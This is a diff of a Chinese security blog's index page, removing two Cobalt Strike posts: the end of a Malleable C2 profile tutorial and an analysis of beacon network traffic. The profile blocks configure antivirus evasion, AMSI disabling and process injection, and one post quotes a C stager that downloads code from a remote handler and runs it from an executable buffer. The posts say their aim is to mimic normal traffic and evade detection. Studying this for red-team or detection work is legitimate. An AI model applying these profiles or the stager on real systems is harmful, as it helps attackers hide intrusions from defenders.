&quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;  </span><br><span class="line"></span><br><span class="line">        output &#123;  &#x2F;&#x2F;对输出的内容进行配置，这里并没有加上其他的处理</span><br><span class="line">        </span><br><span class="line">            #prepend &quot;content&#x3D;&quot;;  </span><br><span class="line"></span><br><span class="line">            #append &quot;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            print;   </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        通过上面的HTTP-Stager的配置后,当stager去请求下载stage时，请求/Events这个uri，并且host的内容都和我们设置的在HTTP-Stager的client中配置的一致。再看看返回包中的内容，请求头中的内容也和我们配置的server部分一致。</p>
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172033813.png" alt="image-20200902172033813"></p>
-<p>​        再看看可扩展的pe和躲避杀软的模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">###Malleable PE&#x2F;Stage Block###</span><br><span class="line">stage &#123;</span><br><span class="line">    set checksum        &quot;0&quot;;  &#x2F;&#x2F;PE头里checksum的值</span><br><span class="line">    set compile_time    &quot;23 Nov 2018 02:25:37&quot;; &#x2F;&#x2F;beacon pe头中显示的编译的时间</span><br><span class="line">    set entry_point     &quot;170000&quot;; &#x2F;&#x2F;beacon pe头中设置的入口点</span><br><span class="line">    #set image_size_x86 &quot;6586368&quot;;  &#x2F;&#x2F;x86 PE头里写的镜像大小</span><br><span class="line">    #set image_size_x64 &quot;6586368&quot;;  &#x2F;&#x2F;x64 PE头里写的镜像大小</span><br><span class="line">    #set name	        &quot;WWanMM.dll&quot;;   &#x2F;&#x2F;	beacon dll 导出的名字</span><br><span class="line">    set userwx 	        &quot;false&quot;;    &#x2F;&#x2F;反射加载时是否要把内存设置为可读可写可执行</span><br><span class="line">    set cleanup	        &quot;true&quot;;  &#x2F;&#x2F;如果选择是则尝试释放反射加载的dll的内存</span><br><span class="line">    set sleep_mask	&quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line">    set stomppe	        &quot;true&quot;; &#x2F;&#x2F;</span><br><span class="line">    set obfuscate	&quot;true&quot;;  &#x2F;&#x2F;是否混淆反射调用dll的导入表，覆盖无用的header内容，请求反射加载器copy beacon到新的内存没有dll头</span><br><span class="line">    set rich_header     &quot;&quot;;  &#x2F;&#x2F;编译器插入的元信息</span><br><span class="line">    </span><br><span class="line">    set sleep_mask &quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line"></span><br><span class="line">    set module_x86 &quot;wwanmm.dll&quot;;  &#x2F;&#x2F;加载一个dll，然后用beacon去覆盖它分配的空间，而不是用VirtualAlloc去分配内存</span><br><span class="line">    set module_x64 &quot;wwanmm.dll&quot;;</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;  &#x2F;&#x2F; 在beacon 反射调用dll之前插入一些数据</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;; </span><br><span class="line">        strrep &quot;beacon.dll&quot; &quot;&quot;;   &#x2F;&#x2F;  查找并替换字符串</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;;</span><br><span class="line">        strrep &quot;beacon.x64.dll&quot; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    #string &quot;something&quot;;   &#x2F;&#x2F;添加字符串</span><br><span class="line">    #data &quot;something&quot;;</span><br><span class="line">    #stringw &quot;something&quot;;   &#x2F;&#x2F;添加UTF-16字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        在看看进程注入的部分</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">###Process Inject Block###</span><br><span class="line">process-inject &#123;</span><br><span class="line"></span><br><span class="line">    set allocator &quot;NtMapViewOfSection&quot;;	&#x2F;&#x2F;在远程进程中分配内存的方式，有两种方式VirtualAllocEx和NtMapViewOfSection，VirtualAlloc是Windows提供的API，通常用来分配大块的内存。例如如果想在进程A和进程B之间通过共享内存的方式实现通信，可以使用该函数（这也是较常用的情况）。利用NtMapViewOfSection在远程进程地址空间写入代码，并且用一种新的技术在远程进程中执行它，这种技术完全工作在用户模式下，并且不需要特殊的条件比如像管理员权限或者之类的要求</span><br><span class="line">    set min_alloc &quot;16700&quot;;  &#x2F;&#x2F;最小的分配内存的大小</span><br><span class="line"></span><br><span class="line">    set userwx &quot;false&quot;;  &#x2F;&#x2F;&#x2F;&#x2F;是否使用rwx作为代码内存的默认权限，默认rx</span><br><span class="line">    </span><br><span class="line">    set startrwx &quot;false&quot;;  &#x2F;&#x2F;是否使用rwx作为代码内存的默认权限,默认rx</span><br><span class="line">        </span><br><span class="line">    transform-x86 &#123;  </span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread &quot;ntdll!RtlUserThreadStart&quot;;    &#x2F;&#x2F;进程可以在其他的进程中创建一个线程 </span><br><span class="line">        CreateThread; </span><br><span class="line">        NtQueueApcThread;  &#x2F;&#x2F;通过NtQueueApcThread实现APC注入</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        RtlCreateUserThread;  &#x2F;&#x2F;创建远程线程的一种技术</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        我们再来看看post-ex块，这个模块用来控制后渗透的行为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">###Post-Ex Block###</span><br><span class="line">post-ex &#123;</span><br><span class="line"></span><br><span class="line">    set spawnto_x86 &quot;%windir%\\syswow64\\gpupdate.exe&quot;;  &#x2F;&#x2F;派生后渗透功能的默认临时进程</span><br><span class="line">    set spawnto_x64 &quot;%windir%\\sysnative\\gpupdate.exe&quot;;</span><br><span class="line"></span><br><span class="line">    set obfuscate &quot;true&quot;;  &#x2F;&#x2F;对dll的内容进行加密，并且将post-ex功能建立到内存中，</span><br><span class="line"></span><br><span class="line">    set smartinject &quot;true&quot;; &#x2F;&#x2F;提示beacon将关键的函数指针嵌入到相同架构的post-ex dll中</span><br><span class="line"> </span><br><span class="line">    set amsi_disable &quot;true&quot;;  &#x2F;&#x2F;关闭amsi,AMSI（Antimalware Scan Interface）， 即反恶意软件扫描接口。在Windows Server 2016和Win10上默认安装并启用。</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​            通过上面的学习，大家应该了解了关于Malleable C2 Profile文件编写的基本的方法，可以根据自己的需要编写自己的Malleable C2 Profile文件，当然我们得知道编写profile文件的目的是为了尽量去模拟正常的网站访问流量。</p>
-<p><strong>参考文章</strong></p>
-<p><a href="https://medium.com/bugbountywriteup/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c" target="_blank" rel="noopener">[RED_TEAM] Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></p>
-<p>CobaltStrike4.0用户手册_中文翻译</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">关于cobaltstrike通信流程的分析</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-09-01 16:15:43" itemprop="dateCreated datePublished" datetime="2020-09-01T16:15:43+08:00">2020-09-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-02 20:03:18" itemprop="dateModified" datetime="2020-09-02T20:03:18+08:00">2020-09-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
-                    <span itemprop="name">cobaltstrike</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        之前我们了解了关于cobaltstrike shell生成的过程，接下来我们一起了解一下cobaltstrike的stager具体是如何工作的，它在目标主机执行后是如何和我们的服务端进行通信的。</p>
-<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>​        在我们分析cobaltstrike的通信过程之前，首先需要了解cobaltstrike的一些基本概念</p>
-<p><strong>Staged Payloads</strong></p>
-<p>​        执行payload的方式分为两种，一种是分阶段加载（Staged）和不分阶段加载（STAGELESS ）。当使用分阶段加载的方式时，一般把程序分为两个部分，stager和stage，stager通常是一个代码量非常小的精简过的汇编代码，它的作用非常简单，就是用来下载stage并载入到内存,也就是主要完成下载远程的stage文件和分配内存将stage加载到内存并执行的功能。在cobaltstrike的官方博客中，给出了一个简单的stager的代码,主要通过C语言实现，通过wsconnect来和远程的地址建立socket通信，下载远程的文件分配内存并载入到内存，最后通过函数指针的形式来进行调用。之所以这么做主要是为了解决payload大小限制的问题。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* connect to the handler *&#x2F;</span><br><span class="line">SOCKET my_socket &#x3D; wsconnect(argv[1], atoi(argv[2]));</span><br><span class="line"> </span><br><span class="line">&#x2F;* read the 4-byte length *&#x2F;</span><br><span class="line">int count &#x3D; recv(my_socket, (char *)&amp;size, 4, 0);</span><br><span class="line">if (count !&#x3D; 4 || size &lt;&#x3D; 0)     punt(my_socket, &quot;read a strange or incomplete length value\n&quot;); &#x2F;* allocate a RWX buffer *&#x2F; buffer &#x3D; VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer &#x3D;&#x3D; NULL)     punt(my_socket, &quot;could not allocate buffer\n&quot;); &#x2F;* prepend a little assembly to move our SOCKET value to the EDI register    thanks mihi for pointing this out    BF 78 56 34 12     &#x3D;&gt;      mov edi, 0x12345678 *&#x2F;</span><br><span class="line">buffer[0] &#x3D; 0xBF;</span><br><span class="line"> </span><br><span class="line">&#x2F;* copy the value of our socket to the buffer *&#x2F;</span><br><span class="line">memcpy(buffer + 1, &amp;my_socket, 4);</span><br><span class="line"> </span><br><span class="line">&#x2F;* read bytes into the buffer *&#x2F;</span><br><span class="line">count &#x3D; recv_all(my_socket, buffer + 5, size);</span><br><span class="line"> </span><br><span class="line">&#x2F;* cast our buffer as a function and call it *&#x2F;</span><br><span class="line">function &#x3D; (void (*)())buffer;</span><br><span class="line">function();</span><br></pre></td></tr></table></figure>
-
-<p>​        我们再了解一下为什么要使用分阶段的方式呢？根据作者的描述有以下几点</p>
-<ul>
-<li>为了解决文件文件大小的问题，另一方面为了和Metasploit兼容</li>
-<li>通常stager作为一个加载器并没有做安全处理，而stage则会做比较好的处理，一般如果别人捕获了stager样本并不会造成什么影响。所以使用分阶段的形式也是为了保护stage</li>
-</ul>
-<p><strong>stageless payload</strong></p>
-<p>​        stageless payload顾名思义就是无阶段payload,那么既然我们已经介绍了关于使用分阶段执行payload的好处，为什么还要再去使用无阶段执行payload呢？原因是在内网横向渗透的过程中，因为目标内网的主机可能无法和外网通信，这个时候如果还使用分阶段执行，目标内网的断网机将无法下载到stage。所以在内网渗透的过程中一般使用的是无阶段的payload。</p>
-<p><strong>beacon</strong></p>
-<p>​        beacon运行在目标主机的用于远程控制的payload，主要用来实现稳定控制目标的功能，并不会实时和cobaltstrike服务端通信，在一段时间后会去检测是否有任务，如果有任务，beacon就会下载任务并且执行。当存在任务时，beacon一般会通过http去输出请求结果，可以通过http或者dns来检查是否有任务。</p>
-<h3 id="beacon通信分析"><a href="#beacon通信分析" class="headerlink" title="beacon通信分析"></a>beacon通信分析</h3><h4 id="staged-payload"><a href="#staged-payload" class="headerlink" title="staged payload"></a>staged payload</h4><p>​        我使用wireshark进行分析，当我执行cobaltstrike生成的分阶段执行的payload时，首先会发起一个http请求，他会请求我们建立的listener端口，返回一个很大的内容</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182559711.png" alt="image-20200901182559711"></p>
-<p>​        这个请求我们也可以在web日志中查看到</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182724592.png" alt="image-20200901182724592"></p>
-<p>​        通过我们之前对分阶段执行payload的了解，我们可以知道这个是去请求stage的请求，我手工请求了以下这个地址，并且将下载后的文件保存为dll文件，将这个dll文件和beacon.dll文件进行对比，发现这两个文件大小基本一致，因此基本可以确定这个请求的开始是加载了beacon.dll这个文件。</p>
-<p>​        继续看其他请求包，我们发现当通过get请求activity这个路径，会刷新beacon的时间。</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901193704075.png" alt="image-20200901193704075"></p>
-<p>​        我尝试在和beacon进行交互，执行一个ipconfig命令，再抓包进行分析，当要执行命令时，我们可以看到当去请求activity这个路径时，已经有了返回内容</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194454763.png" alt="image-20200901194454763"></p>
-<p>​        我们再看下一个包， 可以看到beacon向服务端发起一个post请求，路径为submit.php，并且带有id参数，请求内容为加密后的内容。</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194558581.png" alt="image-20200901194558581"></p>
-<p>​        我尝试进行文件操作，发现传输返回结果还是通过向服务端以post形式请求submit.php。所以看到这里大家知道为什么我们明明免杀都过了，一执行就会被360干掉了，我如果是360，我也知道看有没有通过请求active和submit提交一些加密代码来判断是不是cs的shell了，所以做免杀的时候一定要去改流量特征。</p>
-<h4 id="stageless-payload"><a href="#stageless-payload" class="headerlink" title="stageless payload"></a>stageless payload</h4><p>​        我们再生成一个无阶段的payload执行，再看看通信的流程。</p>
-<p>​        当我执行生成的无阶段的payload时，我发现并没有发送其他包，而是只发送了一个get请求请求match这个路径。当请求了match这个路径，服务端的延时就会刷新一次，所以我们知道这个请求是获取服务端执行命令的请求。</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901195732678.png" alt="image-20200901195732678"></p>
-<p>​        当我们执行ipconfig这个命令后，通过抓包分析，我们发现match会返回一个结果，这个就是需要执行的命令。</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200101283.png" alt="image-20200901200101283"></p>
-<p>​        再看这个请求的下一个数据包，会去请求submit.php，去传递命令执行的结果</p>
-<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200145700.png" alt="image-20200901200145700"></p>
-<p>​        所以我们可以知道再cobaltstrike4.0中，如果使用无阶段的payload放到目标主机执行，会在请求过程中发送大量请求match和submit.php的数据包，这个就可以当作一个流量特征来进行处理。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过关于beacon的流量分析，我们应该了解了关于beacon通信和加载的方式，也应该明白了为什么我们使用CobaltStrike一定要改流量特征了吧。</p>
-<p><strong>参考文章</strong></p>
-<p><a href="https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/" target="_blank" rel="noopener">Staged Payloads – What Pen Testers Should Know</a></p>
-<p><a href="https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/" target="_blank" rel="noopener">What is a stageless payload artifact?</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1975,7 +2114,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">38</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
